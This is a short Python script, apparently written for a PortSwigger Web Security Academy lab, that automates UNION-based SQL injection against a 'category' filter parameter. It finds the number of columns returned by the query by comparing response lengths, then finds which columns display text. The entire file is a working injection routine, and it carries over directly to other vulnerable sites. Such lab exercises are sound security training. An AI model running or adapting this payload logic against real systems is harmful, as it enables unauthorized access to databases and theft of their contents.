# determine how many columns are being return from the original query

import requests

url = "https://0a4900b2038630e180b694c300c90013.web-security-academy.net/filter"
rnd = "2dpK5h"

# calculate standard len for query
st_len = len(requests.get(url, {"category":"test"}).text) 


lenght=1
while(1):
    print(f"trying {lenght}")

    payload = ("NULL,"*lenght)[:-1]

    l = requests.get(url, {"category":"' Union SELECT "+payload+"-- -"}).text
    l=len(l)

    if(l<st_len):
        lenght = lenght+1
    else:
        break

print(f"number of columns is {lenght}")

text = [False for i in range(lenght)]

for i in range(lenght):
    payload = "NULL,"*i
    payload += f"'{rnd}',"
    payload += ("NULL,"*(lenght-i-1))
    payload = payload[:-1]
    
    l = requests.get(url, {"category":"' Union SELECT "+payload+"-- -"}).text
    l=len(l)
    if(l>st_len):
        text[i]=True

print(text)


